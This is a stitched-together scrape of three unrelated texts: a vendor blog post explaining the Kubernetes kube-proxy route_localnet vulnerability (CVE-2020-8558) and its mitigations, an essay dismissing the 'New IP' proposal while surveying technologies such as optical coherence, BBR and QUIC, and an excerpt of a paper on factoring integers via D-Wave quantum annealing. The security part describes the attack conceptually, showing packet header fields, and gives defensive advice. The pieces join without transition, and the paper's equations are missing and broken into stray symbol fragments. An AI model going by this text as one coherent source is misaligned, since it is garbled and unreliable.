kube-proxy is a network proxy running on each node in a Kubernetes cluster. Its job is to manage connectivity among pods and services. [Kubernetes services]( expose a single clusterIP, but may consist of multiple backing pods to enable load balancing. A service may consist of three pods – each with its own IP address – but will expose only one clusterIP, for example, 10.0.0.1. Pods accessing that service will send packets to its clusterIP, 10.0.0.1, but must somehow be redirected to one of the pods behind the service abstraction.
That’s where the kube-proxy comes in. It sets up routing tables on each node, so that requests targeting a service will be correctly routed to one of the pods backing that service. It’s commonly deployed as a static pod or as part of a DaemonSet.
[GKE’s documentation]( has further details, if you’re interested.
There are networking solutions, such as [Cilium]( that could be configured to fully replace the kube-proxy.
The Culprit Is route_localnet
As part of its job, the kube-proxy configures several network parameters through [sysctl files]( One of those is net.ipv4.conf.all.route_localnet – the culprit behind this vulnerability. [Sysctl documentation]( states, “route_localnet: Do not consider loopback addresses as martian source or destination while routing. This enables the use of 127/8 for local routing purposes. default FALSE.”
Let’s unpack that explanation. For IPv4, the loopback addresses consist of the 127.0.0.0/8 address block (127.0.0.1-127.255.255.255), while commonly only 127.0.0.1 is used and has the hostname “localhost” mapped to it. Those are addresses used by your machine to refer to itself. Packets targeting a local service will be sent to IP 127.0.0.1 through the loopback network interface, with their source IP set to 127.0.0.1 as well.
Setting route_localnet instructs the kernel to not define 127.0.0.1/8 IP addresses as martian. What does “martian” mean in this context? Well, some packets arrive at a network interface and make claims about their source or destination IP that just don’t make sense. For example, a packet could arrive with a source IP of 255.255.255.255. That packet shouldn’t exist: 255.255.255.255 can’t identify a host, it’s a reserved address used to indicate broadcast. So what’s going on? Your kernel can’t know for sure and has no choice but to conclude the packet came from Mars and should be dropped.
Martian packets often hint that someone malicious on the network is trying to attack you. In the example above, the attacker may want your service to respond to IP 255.255.255.255, causing routers to broadcast the response. A fishy destination IP can also cause a packet to be deemed martian, such as a packet arriving at an external network interface with a destination IP of 127.0.0.1. Again, that packet doesn’t make sense – 127.0.0.1 is used for internal communication through the loopback interface and shouldn’t arrive from a network-facing interface. For more details on martian packets, refer to [RFC 1812](
In some complicated routing scenarios, you might want the kernel to let certain martian packets pass through. That’s what route_localnet is used for. It instructs the kernel not to consider 127.0.0.0/8 as martian addresses (as it normally would, like in the case discussed in the previous paragraph). The kube-proxy enables route_localnet to support a bunch of routing magic that I won’t get into, but route_localnet is disabled by default for a reason. Unless proper mitigation is set up alongside it, attackers on the local network could exploit route_localnet to perform several attacks. The most impactful is reaching localhost bound services.
Localhost-only Services
Linux allows processes to listen only on a specific IP address so that they can bind themselves to the address of a network interface. Internal services often use that feature to listen only on 127.0.0.1. Normally, this ensures that only local processes can access the service, as only they can reach 127.0.0.1. This assumption is broken with route_localnet, since it allows external packets destined for 127.0.0.0/8. That’s highly concerning given internal services tend not to enforce authentication, expecting external packets will not reach them.
Reaching Internal Services
An attacker attempting to reach the victim’s internal services would need to construct a malicious packet where the destination IP address is set to 127.0.0.1 and the destination MAC address is set to the victim’s MAC address. Without a meaningful destination IP, the attacker’s packet only relies on layer 2 (MAC-based) routing to reach the victim and is thus limited to the local network. Therefore, even if a victim enabled route_localnet, only attackers on the local network could access the victim’s localhost services.
When the victim machine receives the malicious packet, it will let it pass because of route_localnet. Since the packet has a destination IP of 127.0.0.1, it would be eligible to access localhost services. Table 1 shows what a malicious packet may look like. The attacker’s IP is 10.0.0.1 with MAC address XXX, and the target IP is 10.0.0.0.2 with MAC address YYY. The target is running a localhost-only service on port 1234.
src mac
XXX	dst mac	YYY
src ip	10.0.0.1	dst ip	127.0.0.1
src port	random	dst port	1234
Figure 1. A packet exploiting route_localnet
The attacker sends the packet with his IP address to ensure he receives the target’s responses. To summarize, route_localnet allows attackers on the local network to access a host’s internal services with packets like the one shown above.
Back to the Kubernetes Vulnerability (CVE-2020-8558)
Because of kube-proxy, every node in the cluster has route_localnet enabled. As a result, every host on a node’s local network could gain access to the node’s internal services. If your nodes run internal services without authentication, you are affected.
Aside from neighboring hosts on a node’s local network, pods running on the node could also access its internal services. To be clear, a pod can only reach the internal services of the node hosting it. To carry out the attack, the pod must possess the CAP_NET_RAW capability. Unfortunately, Kubernetes grants this capability by default.
When we examined this issue, we tried to identify localhost services that are natively deployed by Kubernetes. We found that by default, the Kubenetes API server serves unauthenticated requests on localhost through a port dubbed the insecure-port. The insecure-port exists to allow other control-plane components running on the master (such as etcd) to easily talk with the api-server. Role-based access control (RBAC) or any other authorization mechanisms are not enforced on that port. Kubernetes installations frequently run the api-server as a pod on the master node, meaning it is running alongside a kube-proxy that has enabled route_localnet.
Alarmingly, this means that if your Kubernetes deployment didn’t disable the insecure-port, hosts on the master node’s local network could exploit CVE-2020-8558 to command the api-server and gain complete control over the cluster.
Managed Kubernetes
Managed Kubernetes platforms such as GKE, EKS and AKS are better protected against CVE-2020-8558.
To begin with, the virtual networks of some cloud service providers (CSPs), such as [Microsoft Azure]( don’t support layer-2 semantics and MAC-based routing. You can easily see how this manifests – every AKS machine has the same MAC address: 12:34:56:78:9A:BC. This mitigates exploitation of CVE-2020-8558 from other hosts on a node’s local network, but malicious pods possessing CAP_NET_RAW should still be able to carry out the attack.
Cloud-hosted Kubernetes offerings also tend to manage the Kubernetes control plane and api-server for you and run them on a separate network from the rest of the cluster. This protects the api-server, as it isn’t exposed to the rest of the cluster. Even if a CSP would run the api-server without disabling the insecure-port, attackers in the cluster wouldn’t be able to access it as they don’t run in the same local network.
Still, if your CSP virtual network does support layer-2 routing, malicious hosts in your cluster’s network could access localhost services on the worker nodes.
The Fix
The [initial fix]( actually resides in the kubelet and adds mitigations around route_localnet: routing rules that cause nodes to drop external packets destined for 127.0.0.1. At the time of writing this post, route_localnet is still enabled by the kube-proxy. There are [ongoing discussions]( about [disabling it](
Even with those mitigations applied, there’s still a special case where a local network attacker could send packets to nodes’ internal UDP services. However, the attack only works if the victim node disables [reverse path filtering (]( normally isn’t case), and in this circumstance the attacker won’t be able to get the response. A [patch]( is being developed, but it may be dropped as the attack depends on an insecure setting (rp_filter=0).
Am I Affected?
If all of the below are true, your cluster is vulnerable to CVE-2020-8558:
- Your cluster is running a vulnerable version (earlier than v1.18.4, v1.17.7, and v1.16.11).
- Note that while the issue originated from the kube-proxy, the patch is in the kubelet.
- Your nodes have the kube-proxy running on them.
- Your nodes (or hostnetwork pods) run localhost-only services which don’t require any further authentication.
Additionally, if the following is also true, your cluster may be vulnerable to a complete takeover through the api-server insecure-port:
- Your cluster doesn’t disable the api-server insecure-port via –insecure-port=0
- The api-server runs on a node alongside a kube-proxy, for example, in deployments where the api-server is a pod itself.
A node could be attacked either by a malicious host on the local network or by a malicious pod with CAP_NET_RAW running on the node.
CVE-2020-8558 can have some serious consequences. You should patch your clusters as soon as possible. CVE-2020-8558 also serves as a reminder that security best practices do work and significantly reduce attack surface. You should disable the api-server insecure-port, and if your pods don’t require CAP_NET_RAW, there’s no reason they should have that capability. While not related to this specific issue, we recommend implementing other security recommendations such as RBAC or running containers as a non-root user.
Palo Alto Networks [Prisma Cloud]( customers are protected from this vulnerability. Compliance rules ensure your clusters are configured securely, blocking or alerting on:
- The api-server insecure port
- Pods running with CAP_NEW_RAW

@_subject: New IP and Emerging Communications Technologies 
A “New IP” framework was proposed to the ITU last year . This framework envisages a resurgence of a network-centric view of communications architectures where application behaviours are moderated by network-managed control mechanisms.
It’s not the first time that we’ve seen proposals to rethink the basic architecture of the Internet’s technology (for example, there were the “Clean Slate” efforts in the US research community a decade or so ago) and it certainly won’t be the last. However, it this New IP framework is very prescriptive in terms of bounding application behaviours, and it seems to ignore the most basic lesson of the past three decades of evolution: communications services are no longer a command economy and these days the sector operates as a conventional market-based economy, and this market for diverse services is expressed in diversity of application behaviours.
What this market-based economy implies is that ultimately what shapes the future of the communications sector, what shapes the services that are provided and even the technologies used to generate such services are the result of consumer choices. Consumers are often fickle, entranced by passing fads, and can be both conservative and adventurous at the same time. But whatever you may think of the sanity of consumer markets, it’s their money that drives this industry. Like any other consumer-focused services market, what consumers want, they get.
However, it’s more than simple consumer preferences. This change in the economic nature of the sector also implies changes in investors and investment, changes in operators and changes in the collective expectations of the sector and the way in which these expectations are phrased. It’s really not up to some crusty international committee to dictate future consumer preferences. Time and time again these committees with their lofty titles, such as “the Focus Group on Technologies for Network 2030” have been distinguished by their innate ability to see their considered prognostications comprehensively contradicted by reality! Their forebears in similar committees missed computer mainframes, then they failed to see the personal computer revolution, and were then totally surprised by the smartphone. It’s clear that no matter what the network will look like some 10 years from now, what it won’t be is what this 2030 Focus Group pondering a new IP is envisaging!
I don’t claim any particular ability to do any better in the area of divination of the future, and I’m not going to try. But in this process of evolution, the technical seeds of the near-term future are already visible today. What I would like to do here is describe that I think are the critically important technical seeds any why.
This is my somewhat arbitrary personal choice of technologies that I think will play a prominent role in the Internet over the next decade.
The foundation technology of the Internet, and indeed of the larger environment of digital communication, is the concept of packetization, replacing the previous model of circuit emulation.
IP advocated a radical change to the previous incumbency of telephony. Rather than an active time switched network with passive edge devices, the IP architecture advocated a largely passive network where the network’s internal elements simply switched packets. The functionality of the service response was intended to be pushed out to the devices at the edge of the network. The respective roles of networks and devices were inverted in the transition to the internet.
But change is hard and for some decades many industry actors with interests in the provision of networks and network services strived to reverse this inversion of the network service model. Network operators tried hard to introduce network-based service responses while handling packet-based payloads. We saw the efforts to develop network-based Quality of Service approaches that attempted to support differential service responses for different classes of packet flows within a single network platform. I think some twenty years later we can call this effort a Grand Failure. Then there was virtual circuit emulation in MPLS and more recently variants of loose source routing (SR) approaches. It always strikes me as odd that these approaches require orchestration across all active elements in a network where the basic functionality of traffic segmentation can be offered at far lower cost through ingress traffic grooming. But, cynically, I guess that the way to sell more fancy routers is to distribute complexity across the entire network. I would hesitate to categorise any of these technologies as emerging, as they seem to be more like regressive measures in many ways, motivated more by a desire to “value-add” to an otherwise undistinguished commodity service of packet transmission. The longevity of some of these efforts to create network-based services is a testament to the level of resistance of network operators to accept their role as a commodity utility, rather than any inherent value in the architectural concept of circuit-based network segmentation.
At the same time, we’ve made some astonishing progress in other aspects of networking. We’ve been creating widely dispersed fault tolerant systems that don’t rely on centralised command and control. Any student of the inter-domain routing protocol BGP, which is has been quietly supporting the Internet for some three decades now, could not fail to be impressed by the almost prescient design of a distributed system for managing a complex network that is now up to nine orders of magnitude larger than the network of the early 1990’s for which is was originally devised. We’ve created a new kind of network that is open and accessible. It was nigh on impossible to create new applications for the telephone network, yet in the Internet that’s what happens all the time. From the vibrant world of apps down to the very basics of digital transmission the world of networking is in a state of constant flux and new technologies are emerging at a dizzying rate.
What can we observe about emerging technologies that will play a critical role in the coming years? Here’s is my personal selection of recent technical innovations that I would classify into the set of emerging technologies that will exercise a massive influence over the coming ten years.
Optical Coherence
For many decades the optical world used the equivalent of a torch. There was either light passing down the cable or there wasn’t. This “on-off keying” (OOK) simple approach to optical encoding was continuously refined to support optical speeds of up to 10Gbps, which is no mean feat of technology, but at that point it was running into some apparently hard limitations of the digital signal processes that OOK is using.
But there is still headroom in the fibre for more signal. We are now turning to Optical Coherence and have unleashed a second wave of innovation in this space. Exploiting Optical Coherence is a repeat of a technique that was been thoroughly exercised in other domains. We used phase-amplitude keying to tune analogue baseband voice circuit modems to produce 56Kbps of signal while operating across a 3Khz bandwidth carrier. Similar approaches were used in the radio world where we now see 4G systems supporting data speeds of up to 200Mbps.
The approach relies on the use of phase-amplitude and polarisation keying to wring out a data capacity close to the theoretical Shannon limit. Optical systems of 100Gpbs per wavelength are now a commodity in the optical marketplace and 400G systems are coming on stream. It’s likely that we will see Terabit optical systems in the coming years using high density phase amplitude modulation coupled with custom-trained digital signal processing. As with other optical systems it’s also likely that we’ll see the price per unit of bandwidth on these systems plummet as the production volumes increase. In today’s world communications capacity is an abundant resource, and that abundance gives us a fresh perspective on network architectures.
What about radio systems? Is 5G an “emerging technology”?
It’s my opinion that that 5G is not all that different from 4G. The real change was shifting from circuit tunnelling using PPP sessions to a native IP packet forwarding system, and that was the major change from 3G to 4G. 5G looks much the same as 4G, and the basic difference is the upward shift in radio frequencies for 5G. Initial 5G deployments use 3.8Ghz carriers, but the intention is to head into the millimetre wave band of 24Ghz to 84Ghz. This is a mixed blessing in that higher carrier frequencies can assign larger frequency blocks and therefore increase carrying capacity of the radio network, but at the same time the higher frequencies use shorter wavelengths and these millimetre-sized shorter wavelengths behave more like light than radio. At higher frequencies the radio signal is readily obstructed by buildings, walls, trees and other larger objects, and to compensate for this any service deployment requires a significantly higher population of base stations to achieve the same coverage. Beyond the hype it’s not clear if there is a sound sustainable economic model of millimetre wave band 5G services.
For those reasons I’m going to put 5G at the bottom of the list of important emerging technologies. Radio and mobile services will remain incredibly important services in the Internet, but 5G represents no radical change in the manner of use of these systems beyond the well-established 4G technology.
It seems odd to consider IPv6 as an “emerging technology” in 2020. The first specification of IPv6, RFC1883, was published in 1995, which makes it a 25-year-old technology. But it does seem that after many years of indecision and even outright denial, the IPv4 exhaustion issues are finally driving deployment decisions and these days one quarter of the Internet’s user devices use IPv6. This number will inexorably rise.
It’s hard to say how long it will take for the other three quarters, but the conclusion looks pretty inevitable. If the definition of “emerging” is one of large-scale increases in adoption in the coming years, then IPv6 certainly appears to fit that characterisation, despite its already quite venerable age!
I just hope that we will work out a better answer to the ongoing issues with IPv6 Extension Headers, particularly in relation to packet fragmentation before we get to the point of having to rely on IPv6-only service environments.
Google’s Bottleneck Bandwidth and Round-trip time TCP control algorithm (BBR) is a revolutionary control algorithm that is in my mind equal in importance to TCP itself. This transport algorithm redefines the relationship between end hosts, network buffers and speed and allows end systems to efficiently consume available network capacity at multi-gigabit speeds without being hampered by poorly designed active packet switching elements.
Loss-based congestion control algorithms have served us well in the past but these days, as we contemplate end-to-end speeds of hundreds of gigabits per second, such conservative loss-based system control algorithms are impractical. BBR implements an entirely new perspective on both flow control and speed management that attempts to stabilise the flow rate at the same rate as a fair share of available network capacity. This is a technology to watch.
There has been a longstanding tension between applications and networks. In the end-to-end world of TCP the network’s resources are shared across the set of active clients in a manner determined by the clients themselves. This has always been an anathema to network operators, who would prefer to actively manage their network’s resources and provide deterministic service outcomes to customers. To achieve this its common to see various forms of policy-based rate policers in networks, where the ‘signature’ of the packet headers can indicate the application that is generating the traffic which, in turn, generate a policy response. Such measures require visibility on the inner contents of each IP packet, which is conventionally the case with TCP.
QUIC is a form of encapsulation that uses a visible outer wrapping of UDP packets and encrypts the inner TCP and content payload. Not only does this approach hide the TCP flow control parameters from the network and the network’s policy engines, it lifts the control of the data flow algorithm away from the common host operating system platform and places it into the hands of each application. This gives greater control to the application, so that the application can adjust its behaviour independent of the platform upon which it is running.
In addition, it removes the requirement of a “one size that is equally uncomfortable for all” model of data flow control used in operating system platform-based TCP applications. With QUIC the application itself can tailor its flow control behaviours to optimise the behaviour of the application within the parameters of the current state of the network path.
It’s likely that this shift of control from the platform to the application will continue. Applications want greater agility, and greater levels of control over their own behaviours and services. By using a basic UDP substrate the host platform’s TCP implementation is bypassed and the application can then operate in a way that is under the complete control of the application.
Resolverless DNS
I was going to say “DNS over HTTPS” (DoH) but I’m not sure that DoH itself is a particularly novel technology, so I’m not sure it fits into this category of “emerging technologies”. We’ve used HTTPS as a firewall-tunnelling and communication privacy-enhancing technology for almost as long as firewalls and privacy concerns have existed, and software tools that tunnel IP packets in HTTPS sessions are readily available and have been for at least a couple of decades. There is nothing novel there. Putting the DNS into HTTPs is just a minor change to the model of using HTTPS as a universal tunnelling substrate.
However, HTTPS itself offers some additional capabilities that plain old DNS over TLS, the secure channel part of HTTPS, cannot intrinsically offer. I’m referring to “server push” technologies in the web. For example, a web page might refer to a custom style page to determine the intended visual setting of the page. Rather than having the client perform another round of DNS resolution and connection establishment to get this style page, the server can simply push this resource to the client along with the page that uses it. From the perspective of HTTP, DNS requests and responses looks like any other data object transactions and pushing a DNS response without a triggering DNS query is, in HTTP terms, little different from, say, pushing a stylesheet.
However, in terms of the naming architecture of the Internet this a profound step of major proportions. What if the names were only accessible within the context of a particular web environment, and inaccessible using any other tool, including conventional DNS queries? The Internet can be defined as a coherent single namespace. We can communicate with each other by sending references to resources, i.e. names, and this makes sense only when the resources I refer to by using a particular name is the same resources that you will refer to when you use the same name. It does not matter what application is used and what might be the context of the query for that name, the DNS resolution result is the same. However, when content pushes resolved names to clients it is simple for content to create its own context and environment that is uniquely different to any other name context. There is no longer one coherent name space but many fragmented potentially overlapping name spaces and no clear way to disambiguate potentially conflicting uses of names.
The driver behind many emerging technologies is speed, convenience and tailing the environment to match each user. From this perspective resolverless DNS is pretty much inevitable. However, the downside is that the internet loses its common coherence and it’s unclear whether this particular technology will have a positive impact on the Internet or a highly destructive one. I guess that we will see in the coming few years!
Quantum Networking
In 1936, long before we built the first of the modern day programable computers British mathematician devised a thought experiment of a universal computing machine, and more importantly he classified problems into “computable” problems where a solution was achievable in finite time, and “uncomputable” problems, where a machine will never halt. In some ways we knew even before the first physical computer that there existed a class of problems that were never going to be solved with a computer. Peter Shor performed a similar feat in 1994, devising an algorithm that performs prime factorization in finite time in a yet-to-be built quantum computer. The capabilities (and limitations) of this novel form of mechanical processing were being mapped out long before any such machine had been built. Quantum Computers are an emerging potentially disruptive technology in the computing world.
There is also a related emerging technology, Quantum Networking, where quantum bits (qubits) are passed between quantum networks. Like many others I have no particular insight as to whether quantum networking will be an esoteric diversion in the evolution of digital networks or whether it will become the conventional mainstream foundation for tomorrow’s digital services. It’s just too early to tell.
Architectural Evolution
Why do we still see constant technical evolution? Why aren’t prepared to say “Well that’s job done. Let’s all head to the pub!” I suspect that the pressures to continue to alter the technical platforms of the Internet comes from the evolution of the architecture of the Internet itself.
One view of the purpose of the original model of the internet was to connect clients to a service. Now we could have each service run a dedicated access network and a client would need to use a specific network to access a specific service but after trying this in a small way the 1980’s the general reaction was to recoil in horror! So we used the Internet as the universal connection network. As long as all services and servers were connected to this common network, then when a client connected, then they could access any service.
In the 1990’s this was a revolutionary step, but as the number of users grew, they outpaced the growth capability of the server model, and the situation became unsustainable. Popular services were a bit like the digital equivalent of a black hole in the network. We needed a different solution and we came up with content distribution networks (CDNs). CDNs use a dedicated network service to maintain a set of equivalent points of service delivery all over the internet. Rather than using a single global network to access any connected service all the client needs is an access network that connects them to the local aggregate CDN access point. The more we use locally accessible services, the less we use the broader network.
What does this mean for technologies?
One implication is the weakening of the incentives to maintain a single consistent connected Internet. If the majority of digitally delivered services desired by users can be obtained through a purely local access framework then who is left to pay for the considerably higher costs of common global transit to access the small residual set of remote-access only services? Do local-only services need access to globally unique infrastructure elements.
NATs are an extreme example of a case in point that local-only services are quite functional with local-only addresses and the proliferation of local use names leads to a similar conclusion. It is difficult to conclude that the pressures for Internet fragmentation increase with the rise of content distribution networks. However, if one looks at fragmentation in the same way as entropy in the physical world, then it requires constant effort to resist fragmentation. Without the constant application of effort to maintain a global system of unique identifiers we appear to move towards networks that only exhibit local scope.
Another implication is the rise of specific service scoping in applications. An example of this can be seen in the first deployments of QUIC. QUIC was exclusively used by Google’s Chrome browser when accessing Google web servers. The transport protocol, which was conventionally was placed into the operating system as a common service for applications was lifted up into the application. The old design considerations that supported the use of common set of operating system functions over the use of tailored application functionality no longer apply. With the deployment of more capable end systems and faster networks we are able to construct highly customised applications. Browsers already support many of the functions that we used to associate only with operating systems, and many applications appear to be following this lead. It’s not just a case of wanting finer levels of control over the end user experience, although that is an important consideration, but also a case of each application shielding its behaviour and interactions with the user from other applications, from the host operating system platform and from the network.
If the money that drives the Internet is the money derived from knowledge of the end user’s habits and desires, which certainly appears to be the case for Google, Amazon, Facebook and Netflix, and many others, then it would be folly for these applications to expose their knowledge to any third party. Instead of applications that rely on a rich set of services provided by the operating system and the network we are seeing the rise of the paranoid application as the new technology model. These paranoid applications not only minimize their points of external reliance, they attempt to minimise the visibility of their behaviours as well.
Change as a Way of Life
The pressure of these emerging technologies competing with the incumbent services and infrastructure in the Internet are perhaps the most encouraging sign that the Internet is still alive and is still quite some time away from a slide into obsolescence and irrelevance. We are still changing the basic transmission elements, changing the underlying transport protocols, changing the name and addressing infrastructure and change the models of service delivery.
And that’s about the best signal we could have that the Internet is by no means a solved problem and it still poses many important technology challenges.
Where does this leave the New IP proposal?
In my view it’s going nowhere useful. I think it heads to the same fate as a long list of predecessors as yet another rather useless effort to adorn the network with more useless knobs and levers in an increasing desperate attempt to add value to the network that no users are prepared to pay for.
The optical world and the efforts of the mobile sector are transforming communications into an abundant undistinguished commodity and such efforts to ration it out in various ways, or adding unnecessary adornments are totally misguided efforts. Applications are no longer being managed by the network. There is little left of any form of cooperation between the network and the application, as the failure of ECN attests. Applications are now hiding their control mechanisms from the network and making fewer and fewer assumptions about the characteristics of the network, as we see with QUIC and BBR.
So if all this is a Darwinian process of evolutionary change than it seems to me that the evolutionary attention currently lives in user space as applications on our devices. Networks are just there to carry packets.

[Published: 28 April 2020](
This paper provides a new (second) way, which is completely different from Shor’s algorithm, to show the optimistic potential of a D-Wave quantum computer for deciphering RSA and successfully factoring all integers within 10000. Our method significantly reduced the local field coefficient and coupling term coefficient by more than 33% and 26%, respectively, of those of Ising model, which can further improve the stability of qubit chains and improve the upper bound of integer factorization. In addition, our results obtained the best index (20-bit integer (1028171)) of quantum computing for deciphering RSA via the quantum computing software environment provided by D-Wave. Furthermore, Shor’s algorithm requires approximately 40 qubits to factor the integer 1028171, which is far beyond the capacity of universal quantum computers. Thus, post quantum cryptography should further consider the potential of the D-Wave quantum computer for deciphering the RSA cryptosystem in future.
The majority of scholars think that Shor’s algorithm is a unique and powerful quantum algorithm for the cryptanalysis of RSA. Therefore, the current state of the post quantum cryptography (constructing post quantum public key cryptosystems that would be secure against quantum computers) research has exclusively studied the potential threats to Shor’s algorithm.
The security of the RSA cryptography system is based on the high complexity and security of the integer factorization problem. Shor’s algorithm[1]( can attack the RSA cryptosystem in polynomial time. There have been many simulations about quantum computers[2]( and attempts to implement Shor’s algorithm on quantum computing hardware[3]( Researchers have developed classic emulators based on reconfigurable technology, enabling efficient simulation of various quantum algorithms and circuits, and they have the potential to simulate number of quits than software based simulators[2]( Nuclear Magnetic Resonance (NMR) is the technology that we have for the implementation of small quantum computers. Vandersypen et al.[8]( and Lu et al.[9]( applied Shor’s algorithm to factor the integer 15 via NMR and an optical quantum computer, respectively. Enrique et al. implemented a scalable version of Shor’s algorithm via the iterative approach to factor 21[10]( Based on the characteristics of the Fermat number[11]( Geller et al. used 8 qubits to successfully factor 51 and 85.
The real physical realizations of Shor’s algorithm cannot breakthrough the scale of factorization beyond 100 for the moment, as shown by principle-of-proof simulations and experiments[12]( Actually, the number of qubits for performing Shor’s algorithm to factor an n-bit integer still remains approximately 2n qubits[13]( Shor’s algorithm requires not only a large number of qubits but also a general-purpose quantum computer with high precision. Achieving practical quantum applications will take longer, perhaps much longer, as said by John Martinis, the physicist who leads Google’s efforts[14]( and Science[15]( commented that it will be years before code-cracking is achieved. Matthias Troyer said that “code-cracking and searching databases, are not good enough”[16]( The newest report by the National Academies of Sciences, “Quantum Computing: Progress and Prospects”, stated that the current state of quantum computing and progress is highly unlikely to be able to attack RSA 2048 within the next decade. Therefore, in the case where Shor’s algorithm cannot be practically applied, it is of great importance to find a more generalized and scalable way with the potential for practical attacks on integers while using fewer quantum resources.
The quantum adiabatic theorem was first introduced in 2001 by Burges[17]( The main idea is to construct the corresponding Hamiltonian based on the multiplication table[18]( Xu, N. et al. realized an experimental realization of factoring 143 via an NMR quantum processor[18]( By further employing the properties of some class of large integers, Dattani et al. factored the integer 56153 with only 4 qubits[19]( and Li et al. factored 291311 with 3 qubits by combining the theoretical reductions and Hamiltonian transformation[20]( However, these methods are only available for integers with special properties and cannot be generalized to large integers, which can merely be seen as a principle-of-proof experiment. In adiabatic quantum computation, some researchers[21]( realize the reduction of multiple terms to quadratic terms without introducing auxiliary qubits, but too many restrictions increase the complexity of the model. Thus, it is of great importance to find a more generalized way to conduct prime factorization.
D-Wave quantum computer is based on the quantum annealing principle. It has been widely used in sampling, optimization, machine learning, etc.[23]( Raouf Dridi et al.[27]( applied the computational algebraic geometry to transform the factorization problem to the QUBO model to be solved by the cell algorithm and the column algorithm respectively. The experiments via the D-Wave 2X show that dividing the columns to construct the Hamiltonian that is to be solved via quantum annealing can factor the integer 200099. Jiang et al.[30]( constructed a general model to factor the integer 376289 with 94 logical qubits via a D-Wave 2000Q System. However, it is still limited by the hardware restrictions of the quantum machine[31]( Peng et al.[32]( further promoted Jiang et al.’s work by reducing the number of qubits according to the constraints of the target values and the number of carrying numbers involved in the multiplication table. XinMei Wang[33]( commented that Peng et al.[32]( supported the optimistic potential of a D-Wave quantum computer for deciphering the RSA cryptosystem in the future. In 2019, Lockheed Martin’s Warren, R.H.[34]( proposed a chain factorization algorithm to factor all integers within 1000 by setting the upper limit of the factorability. However, this model uses more logical qubits, which means there is qubit redundancy.
In this work, we put forward a new independent model for prime factorization with few qubits to be solved by QA, and it successfully factors 1028171 via 88 qubits with the qbsolv software environment (the quantum computing software environment provided by D-Wave). This is superior to the results obtained by any other quantum algorithm, including Shor’s algorithm (factor up to 85) via different platforms (like the Hua-Wei quantum computing platform), quantum adiabatic computation via NMR (291311), and quantum annealing via the D-Wave platform (376289). Compared with ref. [30]( in this paper, the local field coefficient h
and coupling term coefficientJ
of Ising model are optimized to reduce the range of the model parameters, which reduces the coupling strength between qubits, further improves the stability of qubit chains and further improves the upper bound of the integer factorization. Our method has obtained the best index (20-bit integers (1028171)) of quantum computing for deciphering RSA, and it also exceeded the theoretical maximum (10-bit integers) of the IBM Q System OneTM
with Shor’s algorithm, the work of Shuxian Jianget al. (376289), and the maximum scale (7781) of Lockheed Martin’s Warren, R.H. It supports the optimistic potential of the quantum annealing algorithm and D-Wave quantum computer for deciphering the RSA cryptosystem in the future. The D-Wave provides a new (second) way, which is a completely different way than Shor’s algorithm, and may be closer to cracking practical RSA codes than a general-purpose quantum computer using Shor’s algorithm.
The rest of this paper is organized as follows. First, we describe the basic ideas of quantum annealing and the multiplication table for factorization. Second, we compare the methods and results with those of Shor’s algorithm, NMR, and integer factorization by a D-Wave. Third, we illustrate the optimistic potential of the quantum annealing algorithm and D-Wave quantum computer for deciphering the RSA cryptosystem. Finally, we point out that post quantum cryptography should not only consider the potential attacks from universal quantum algorithms, such as Shor’s algorithm but also consider real attacks from a D-Wave quantum computer in the near future.
Quantum annealing
Quantum annealing, as the core algorithm of a D-Wave quantum computer, has the potential to approach or even achieve the global optima in an exponential solution space, corresponding to the quantum evolution towards the ground state of the Hamiltonian problem[24]( The quantum processing units (QPUs), which are the core components for performing quantum annealing, are designed to solve quadratic unconstrained binary optimization (QUBO) problems[25]( where each qubit represents a variable, and the couplers between qubits represent the costs associated with qubit pairs.
The objective form of the QUBO that the QPU is designed to minimize is as follows:
where Obj
represents objective function of QUBO,x
is a vector of binary variables of sizeN
, and Q is an N×N
real-valued matrix characterizing the relationship between the variables. Thus, any problem given in such a form can be solved by the D-Wave quantum annealer.
Multiplication table for factorization
Quantum annealing uses the quantum effects generated by quantum fluctuations to realize the global optimal solution of the objective function. The integer factorization problem can be transformed into a combination optimization problem that can be handled by the quantum annealing algorithm, and the minimum energy value can be output through the quantum annealing algorithm. At this time, the minimum value is the successful solution of integer factorization. To clarify the integer factorization method via quantum annealing, we introduce a multiplication table to illustrate the feasibility of mapping the integer factorization problem to Ising model (a model can be processed by a D-Wave quantum computer). We illustrate the factorization of the integer multiplication table by factoring N=p×q
, where p
are prime numbers. Table [1]( shows the factorization of 143=11×13
. In Table [1]( pi
represent the bits of the multipliers, andzij
is the carried bits fromi
th bit to the j
th bit. All the variables pi
, qi
, and zij
in the equations are binary.

Note: All of the variables involved in Table [1]( can only take the values of {0,1}
. Adding each column leads to the following equations:
Because each of the variables should be 0 or 1, we can get z12=0
according to the equationp1+q1=1+2z12
. By applying similar judgments, we can get a simplified set of equations, as follows:
Obviously, (p1+q1−1)2
, (p2+q2−1)2
, and (p2q1+p1q2−1)2
. The objective function is defined as the sum of squares of the three equations. It can be given as follows:
It can be seen from the above that the minimum value of Eq. [(12)]( is 0, that is, (p1,p2,q1
, and q2)
are the values that minimize Eq. [(12)]( and it is also the solution of Eqs. [(9)]( This means that the values of (p1,p2,q1
, and q2)
represent the solution to the factorization problem.
The improved multiplication table for factorization
In the improved multiplication table for 143, c1
, c2
, c3
are the carried bits from the previous column. All the variables have a value of 0 or 1. Shuxian Jianget al.[30]( divided the multiplication table into 4 columns (from right to left are column 1, column 2, column 3, and column 4), as shown in Table [2](
Table 2 Improved multiplication table for 143=11×13
in binary.
Full size table
The equation for each column is as follows:
Equations [(13)]( are further simplified to the following
We define the objective function as the sum of the squares of all the columns as follows:
Since Ising model can only deal with the interaction of two variables, it is necessary to process polynomials greater than the 2-local term. According to the properties p2=p
, q2=q
, and c2=c
(the values ofp
, q
are 0 or 1), Eq. [(19)]( is expanded and simplified, and the polynomials of more than 2-local term are replaced by the following equation[30]( (for more information about factorization refer to ref. [30](
We replace p1q1
, p1q2
, p2q2
, and p2q1
, t2
, t3
, and t4
, respectively. In Eq. [(20)]( the variable xi
is used to represent the rule that the cubic term is reduced to the 2-local term. For example, the expansion termp1q1q2
in Eq. [(19)]( is replaced by t1q2+2(p1q1−2p1t1−2q1t1+3t1)
. Then, we perform variable replacement to transform the variables into the domain 0,1

, p2=s2
, q1=s3
, q2=s4⋯
, t3=s11
, and t4=s12
, Eq. [(19)]( finally simplifies to the following:
The local field h
represents the coefficient value of the single term of allsi
variables, and the couplingJ
is the coefficient value of the 2-local term for allsisj
variables. The final model can be given as follows:
Then, the model given in Eqs. [(22)]( can be directly solved by the D-Wave machine or the qbsolv software environment can be used to perform the quantum annealing algorithm. In this way, the model for the factorization can be generalized to any integer. Furthermore, it is a scalable model for any large integer in theory and it is a real potential application for D-Wave.
